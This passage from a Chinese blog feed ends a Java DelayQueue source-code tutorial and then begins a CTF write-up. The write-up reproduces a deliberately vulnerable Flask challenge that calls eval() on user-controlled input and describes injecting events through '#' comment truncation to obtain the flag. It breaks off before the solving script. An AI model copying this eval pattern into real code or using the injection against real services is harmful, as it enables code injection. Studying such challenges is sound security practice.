                        // 因为有可能其它线程先一步获取了锁并弹出了堆顶元素
                        // 条件锁的唤醒分成两步，先从Condition的队列里出队
                        // 再入队到AQS的队列中，当其它线程调用LockSupport.unpark(t)的时候才会真正唤醒
                        // 关于AQS我们后面会讲的^^
                        available.awaitNanos(delay);
                    } finally {
                        // 如果leader还是当前线程就把它置为空，让其它线程有机会获取元素
                        if (leader == thisThread)
                            leader = null;
                    }
                }
            }
        }
    } finally {
        // 成功出队后，如果leader为空且堆顶还有元素，就唤醒下一个等待的线程
        if (leader == null &amp;amp;&amp;amp; q.peek() != null)
            // signal()只是把等待的线程放到AQS的队列里面，并不是真正的唤醒
            available.signal();
        // 解锁，这才是真正的唤醒
        lock.unlock();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;take()方法稍微要复杂一些：&lt;/p&gt;
&lt;p&gt;（1）加锁；&lt;/p&gt;
&lt;p&gt;（2）判断堆顶元素是否为空，为空的话直接阻塞等待；&lt;/p&gt;
&lt;p&gt;（3）判断堆顶元素是否到期，到期了直接调用优先级队列的poll()弹出元素；&lt;/p&gt;
&lt;p&gt;（4）没到期，再判断前面是否有其它线程在等待，有则直接等待；&lt;/p&gt;
&lt;p&gt;（5）前面没有其它线程在等待，则把自己当作第一个线程等待delay时间后唤醒，再尝试获取元素；&lt;/p&gt;
&lt;p&gt;（6）获取到元素之后再唤醒下一个等待的线程；&lt;/p&gt;
&lt;p&gt;（7）解锁；&lt;/p&gt;
&lt;h2 id=&quot;使用方法&quot;&gt;使用方法&lt;/h2&gt;
&lt;p&gt;说了那么多，是不是还是不知道怎么用呢？那怎么能行，请看下面的案例：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class DelayQueueTest {
    public static void main(String[] args) {
        DelayQueue&amp;lt;Message&amp;gt; queue = new DelayQueue&amp;lt;&amp;gt;();

        long now = System.currentTimeMillis();

        // 启动一个线程从队列中取元素
        new Thread(()-&amp;gt;{
            while (true) {
                try {
                    // 将依次打印1000，2000，5000，7000，8000
                    System.out.println(queue.take().deadline - now);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();

        // 添加5个元素到队列中
        queue.add(new Message(now + 5000));
        queue.add(new Message(now + 8000));
        queue.add(new Message(now + 2000));
        queue.add(new Message(now + 1000));
        queue.add(new Message(now + 7000));
    }
}

class Message implements Delayed {
    long deadline;

    public Message(long deadline) {
        this.deadline = deadline;
    }

    @Override
    public long getDelay(TimeUnit unit) {
        return deadline - System.currentTimeMillis();
    }

    @Override
    public int compareTo(Delayed o) {
        return (int) (getDelay(TimeUnit.MILLISECONDS) - o.getDelay(TimeUnit.MILLISECONDS));
    }

    @Override
    public String toString() {
        return String.valueOf(deadline);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;是不是很简单，越早到期的元素越先出队。&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;（1）DelayQueue是阻塞队列；&lt;/p&gt;
&lt;p&gt;（2）DelayQueue内部存储结构使用优先级队列；&lt;/p&gt;
&lt;p&gt;（3）DelayQueue使用重入锁和条件来控制并发安全；&lt;/p&gt;
&lt;p&gt;（4）DelayQueue常用于定时任务；&lt;/p&gt;
&lt;h2 id=&quot;彩蛋&quot;&gt;彩蛋&lt;/h2&gt;
&lt;p&gt;java中的线程池实现定时任务是直接用的DelayQueue吗？&lt;/p&gt;
&lt;p&gt;当然不是，ScheduledThreadPoolExecutor中使用的是它自己定义的内部类DelayedWorkQueue，其实里面的实现逻辑基本都是一样的，只不过DelayedWorkQueue里面没有使用现成的PriorityQueue，而是使用数组又实现了一遍优先级队列，本质上没有什么区别。&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;欢迎关注我的公众号“彤哥读源码”，查看更多源码系列文章, 与彤哥一起畅游源码的海洋。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/alan-tang-tt/yuan/raw/master/%E6%AD%BB%E7%A3%95%20java%E9%9B%86%E5%90%88%E7%B3%BB%E5%88%97/resource/qrcode_ss.jpg&quot; alt=&quot;qrcode&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 28 Apr 2019 15:33:00 +0000</pubDate>
<dc:creator>彤哥读源码</dc:creator>
<og:description>DelayQueue是阻塞队列吗？ DelayQueue的实现方式？ DelayQueue主要用于什么场景？</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/tong-yuan/p/DelayQueue.html</dc:identifier>
</item>
<item>
<title>几道web题简单总结 - tr1ple</title>
<link>http://www.cnblogs.com/wfzWebSecuity/p/10747867.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wfzWebSecuity/p/10747867.html</guid>
<description>&lt;p&gt;拖了好长时间，总结一下这一段时间做的几道值得记录一下的题目，有的没做出来，但是学习到了新的东西&lt;/p&gt;

&lt;p&gt;  ddctf的一道题目，学到了python eval函数的用法，首先分析题目：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;60&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; -*- encoding: utf-8 -*-&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; written in python 2.7&lt;/span&gt;
&lt;span&gt;__author__&lt;/span&gt; = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;garzon&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;

&lt;span&gt;from&lt;/span&gt; flask &lt;span&gt;import&lt;/span&gt;&lt;span&gt; Flask, session, request, Response
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; urllib

app &lt;/span&gt;= Flask(&lt;span&gt;__name__&lt;/span&gt;&lt;span&gt;)
app.secret_key &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;*********************&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; censored&lt;/span&gt;
url_prefix = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;/d5af31f99147e857&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;


&lt;span&gt;def&lt;/span&gt;&lt;span&gt; FLAG():
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;FLAG_is_here_but_i_wont_show_you&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; censored&lt;/span&gt;


&lt;span&gt;def&lt;/span&gt;&lt;span&gt; trigger_event(event):
    session[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;log&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;].append(event)
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; len(session[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;log&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;]) &amp;gt; 5: session[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;log&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] = session[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;log&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;][-5&lt;span&gt;:]
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; type(event) ==&lt;span&gt; type([]):
        request.event_queue &lt;/span&gt;+=&lt;span&gt; event
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
        request.event_queue.append(event)


&lt;/span&gt;&lt;span&gt;def&lt;/span&gt; get_mid_str(haystack, prefix, postfix=&lt;span&gt;None):
    haystack &lt;/span&gt;= haystack[haystack.find(prefix) +&lt;span&gt; len(prefix):]
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; postfix &lt;span&gt;is&lt;/span&gt; &lt;span&gt;not&lt;/span&gt;&lt;span&gt; None:
        haystack &lt;/span&gt;=&lt;span&gt; haystack[:haystack.find(postfix)]
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; haystack


&lt;/span&gt;&lt;span&gt;class&lt;/span&gt; RollBackException: &lt;span&gt;pass&lt;/span&gt;


&lt;span&gt;def&lt;/span&gt;&lt;span&gt; execute_event_loop():
    valid_event_chars &lt;/span&gt;= set(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    resp &lt;/span&gt;=&lt;span&gt; None
    &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; len(request.event_queue) &amp;gt;&lt;span&gt; 0:
        event &lt;/span&gt;= request.event_queue[0]  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;&lt;/span&gt;
        request.event_queue = request.event_queue[1&lt;span&gt;:]
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;not&lt;/span&gt; event.startswith((&lt;span&gt;'&lt;/span&gt;&lt;span&gt;action:&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;func:&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)): &lt;span&gt;continue&lt;/span&gt;
        &lt;span&gt;for&lt;/span&gt; c &lt;span&gt;in&lt;/span&gt;&lt;span&gt; event:
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; c &lt;span&gt;not&lt;/span&gt; &lt;span&gt;in&lt;/span&gt; valid_event_chars: &lt;span&gt;break&lt;/span&gt;
        &lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
            is_action &lt;/span&gt;= event[0] == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
            action &lt;/span&gt;= get_mid_str(event, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; index&lt;/span&gt;
            args = get_mid_str(event, action + &lt;span&gt;'&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).split(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;) &lt;span&gt;#&lt;/span&gt;&lt;span&gt;True#True&lt;/span&gt;
            &lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
                event_handler &lt;/span&gt;= eval(action + (&lt;span&gt;'&lt;/span&gt;&lt;span&gt;_handler&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; is_action &lt;span&gt;else&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;_function&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;))
                ret_val &lt;/span&gt;=&lt;span&gt; event_handler(args)
            &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; RollBackException:
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; resp &lt;span&gt;is&lt;/span&gt; None: resp = &lt;span&gt;''&lt;/span&gt;&lt;span&gt;
                resp &lt;/span&gt;+= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;ERROR! All transactions have been cancelled. &amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
                resp &lt;/span&gt;+= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;a href=&quot;./?action:view;index&quot;&amp;gt;Go back to index.html&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
                session[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;num_items&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] = request.prev_session[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;num_items&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]
                session[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;points&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] = request.prev_session[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;points&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]
                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;
            &lt;span&gt;except&lt;/span&gt;&lt;span&gt; Exception, e:
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; resp &lt;span&gt;is&lt;/span&gt; None: resp = &lt;span&gt;''&lt;/span&gt;
                &lt;span&gt;#&lt;/span&gt;&lt;span&gt; resp += str(e) # only for debugging&lt;/span&gt;
                &lt;span&gt;continue&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; ret_val &lt;span&gt;is&lt;/span&gt; &lt;span&gt;not&lt;/span&gt;&lt;span&gt; None:
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; resp &lt;span&gt;is&lt;/span&gt;&lt;span&gt; None:
                    resp &lt;/span&gt;=&lt;span&gt; ret_val
                &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
                    resp &lt;/span&gt;+=&lt;span&gt; ret_val
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; resp &lt;span&gt;is&lt;/span&gt; None &lt;span&gt;or&lt;/span&gt; resp == &lt;span&gt;''&lt;/span&gt;: resp = (&lt;span&gt;'&lt;/span&gt;&lt;span&gt;404 NOT FOUND&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, 404&lt;span&gt;)
    session.modified &lt;/span&gt;=&lt;span&gt; True
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; resp


@app.route(url_prefix &lt;/span&gt;+ &lt;span&gt;'&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; entry_point():
    querystring &lt;/span&gt;=&lt;span&gt; urllib.unquote(request.query_string)
    request.event_queue &lt;/span&gt;=&lt;span&gt; []
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; querystring == &lt;span&gt;''&lt;/span&gt; &lt;span&gt;or&lt;/span&gt; (&lt;span&gt;not&lt;/span&gt; querystring.startswith(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;action:&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)) &lt;span&gt;or&lt;/span&gt; len(querystring) &amp;gt; 100&lt;span&gt;:
        querystring &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;action:index;False#False&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;num_items&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;not&lt;/span&gt; &lt;span&gt;in&lt;/span&gt;&lt;span&gt; session:
        session[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;num_items&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] =&lt;span&gt; 0
        session[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;points&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] = 3&lt;span&gt;
        session[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;log&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] =&lt;span&gt; []
    request.prev_session &lt;/span&gt;=&lt;span&gt; dict(session)
    trigger_event(querystring)
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; execute_event_loop()


&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; handlers/functions below --------------------------------------&lt;/span&gt;

&lt;span&gt;def&lt;/span&gt;&lt;span&gt; view_handler(args):
    page &lt;/span&gt;=&lt;span&gt; args[0]
    html &lt;/span&gt;= &lt;span&gt;''&lt;/span&gt;&lt;span&gt;
    html &lt;/span&gt;+= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;[INFO] you have {} diamonds, {} points now.&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;.format(session[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;num_items&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;], session[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;points&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;])
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; page == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;index&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
        html &lt;/span&gt;+= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;a href=&quot;./?action:index;True%23False&quot;&amp;gt;View source code&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
        html &lt;/span&gt;+= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;a href=&quot;./?action:view;shop&quot;&amp;gt;Go to e-shop&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
        html &lt;/span&gt;+= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;a href=&quot;./?action:view;reset&quot;&amp;gt;Reset&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
    &lt;span&gt;elif&lt;/span&gt; page == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;shop&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
        html &lt;/span&gt;+= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;a href=&quot;./?action:buy;1&quot;&amp;gt;Buy a diamond (1 point)&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
    &lt;span&gt;elif&lt;/span&gt; page == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;reset&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
        &lt;/span&gt;&lt;span&gt;del&lt;/span&gt; session[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;num_items&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]
        html &lt;/span&gt;+= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Session reset.&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
    html &lt;/span&gt;+= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;a href=&quot;./?action:view;index&quot;&amp;gt;Go back to index.html&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
    &lt;span&gt;return&lt;/span&gt;&lt;span&gt; html


&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; index_handler(args):
    bool_show_source &lt;/span&gt;=&lt;span&gt; str(args[0])
    bool_download_source &lt;/span&gt;= str(args[1&lt;span&gt;])
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; bool_show_source == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;True&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:

        source &lt;/span&gt;= open(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;eventLoop.py&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;r&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
        html &lt;/span&gt;= &lt;span&gt;''&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; bool_download_source != &lt;span&gt;'&lt;/span&gt;&lt;span&gt;True&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
            html &lt;/span&gt;+= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;a href=&quot;./?action:index;True%23True&quot;&amp;gt;Download this .py file&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
            html &lt;/span&gt;+= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;a href=&quot;./?action:view;index&quot;&amp;gt;Go back to index.html&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;

        &lt;span&gt;for&lt;/span&gt; line &lt;span&gt;in&lt;/span&gt;&lt;span&gt; source:
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; bool_download_source != &lt;span&gt;'&lt;/span&gt;&lt;span&gt;True&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
                html &lt;/span&gt;+= line.replace(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;amp;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;amp;amp;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).replace(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;\t&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;amp;nbsp;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; * 4).replace(&lt;span&gt;'&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;amp;nbsp;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).replace(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
                                                                                                              &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;amp;lt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;).replace(
                    &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).replace(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;\n&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
                html &lt;/span&gt;+=&lt;span&gt; line
        source.close()

        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; bool_download_source == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;True&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
            headers &lt;/span&gt;=&lt;span&gt; {}
            headers[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Content-Type&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;text/plain&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
            headers[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Content-Disposition&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;attachment; filename=serve.py&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt; Response(html, headers=&lt;span&gt;headers)
        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; html
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
        trigger_event(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;action:view;index&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)


&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; buy_handler(args):
    num_items &lt;/span&gt;=&lt;span&gt; int(args[0])
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; num_items &amp;lt;= 0: &lt;span&gt;return&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;invalid number({}) of diamonds to buy&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(args[0])
    session[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;num_items&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] +=&lt;span&gt; num_items
    trigger_event([&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;func:consume_point;{}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;.format(num_items), &lt;span&gt;'&lt;/span&gt;&lt;span&gt;action:view;index&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;])


&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; consume_point_function(args):
    point_to_consume &lt;/span&gt;=&lt;span&gt; int(args[0])
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; session[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;points&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] &amp;lt; point_to_consume: &lt;span&gt;raise&lt;/span&gt;&lt;span&gt; RollBackException()
    session[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;points&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] -=&lt;span&gt; point_to_consume


&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; show_flag_function(args):
    flag &lt;/span&gt;=&lt;span&gt; args[0]
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.&lt;/span&gt;
    &lt;span&gt;return&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;You naughty boy! ;) &amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;


&lt;span&gt;def&lt;/span&gt;&lt;span&gt; get_flag_handler(args):
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; session[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;num_items&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] &amp;gt;= 5&lt;span&gt;:
        trigger_event(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;func:show_flag;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; + FLAG())  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; show_flag_function has been disabled, no worries&lt;/span&gt;
    trigger_event(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;action:view;index&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)


&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;__name__&lt;/span&gt; == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__main__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
    app.run(debug&lt;/span&gt;=False, host=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;0.0.0.0&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这道题目首先通读源码是必须的，另一个必须要了解到的出题点在eval()函数这个地方，eval中可以传入#来注释掉后面的部分&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201904/1063309-20190428135644629-1610188505.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;从上图可以看出来，此时eval会忽略掉#后面的所有字符串，以及要做出这道题的另一个点：&lt;/p&gt;
&lt;p&gt;打破程序进行的流程，先加钻石数量再检验钱数，并且可以给事件传入一个列表，那么先加钻石，在检验钱之前去getflag即可，而且这里会把flag带到log中去，总之就是在一个正常的处理序列中去插入一个新的事件，因为eval这里可控，所以刚开始就应该反映到出题点&lt;/p&gt;
&lt;p&gt;在这里！&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;50&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;!/usr/bin/env python&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; -*- coding: utf-8 -*-&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; @Time    : 12/1/2019 2:58 PM&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; @Author  : fz&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; @Site    : &lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; @File    : agent.py&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; @Software: PyCharm&lt;/span&gt;

